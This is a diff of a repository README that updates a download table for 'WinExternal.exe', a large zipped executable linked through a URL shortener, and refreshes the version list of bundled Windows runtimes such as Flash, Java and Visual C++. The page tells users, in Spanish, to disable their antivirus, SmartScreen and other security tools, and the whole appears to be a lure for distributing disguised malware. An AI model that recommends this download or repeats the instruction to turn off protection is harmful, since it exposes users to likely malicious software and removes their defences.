@@ -10,9 +10,9 @@
 
 ---
 
-|File|Version|OS|Update|Size|
-| :---: | :---: | :---: | :---: | :---: |
-|[WinExternal.exe (.zip)](http://pc.cd/wBT7)|1.0|Windows 7/8/10 x86 x64|May 12/2020|461,8 MB|
+|File|OS|Size|
+| :---: | :---: | :---: |
+|[WinExternal.exe (.zip)](http://pc.cd/wBT7)|Windows 7/8/10 x86 x64|461,8 MB|
 
 ## HOW TO USE
 
@@ -26,10 +26,10 @@ Desactive su Antivirus, Antimalware, SmartScreen o cualquier otra solución de s
 
 ---
 
-- Adobe Flash Player ActiveX 32 (32.0.0.371) (IE)
-- Adobe Flash Player NPAPI 32 (32.0.0.371) (Firefox)
+- Adobe Flash Player ActiveX 32 (32.0.0.403) (IE)
+- Adobe Flash Player NPAPI 32 (32.0.0.403) (Firefox)
 - Adobe Shockwave Player 12.3 (12.3.5.205)
-- Oracle Java 8 Update 251 (8.0.2510.0)
+- Oracle Java 8 Update 261 (8.0.2610.0)
 - Microsoft Silverlight x86 x64 (5.1.50918.0)
 - Microsoft Visual Legacy Runtimes x86: Basic/C++ 2002 (7.0.9975.0) - 2003 (7.10.6119.0)
 - Microsoft Visual C++ 2005 Redistributable x86 x64 (8.0.50727.6229)
@@ -37,7 +37,7 @@ Desactive su Antivirus, Antimalware, SmartScreen o cualquier otra solución de s
 - Microsoft Visual C++ 2010 Redistributable x86 x64 (10.0.40219.473)
 - Microsoft Visual C++ 2012 Additional and Minimum Runtime x86 x64 (11.0.61135.400)
 - Microsoft Visual C++ 2013 Additional and Minimum Runtime x86 x64 (12.0.40664.0)
-- Microsoft Visual C++ 2019 Additional and Minimum Runtime x86 x64 (14.24.28720)
+- Microsoft Visual C++ 2019 Additional and Minimum Runtime x86 x64 (14.27.29016.0)
 - Microsoft Visual J# 2.0 Redistributable Package - SE x86 x64
 - Microsoft Visual Studio 2010 F# Runtime 2.0 SP1 (10.0.40219)
 - Microsoft Visual Studio 2010 Tools for Office Runtime x86 x64 (10.0.60833.0)
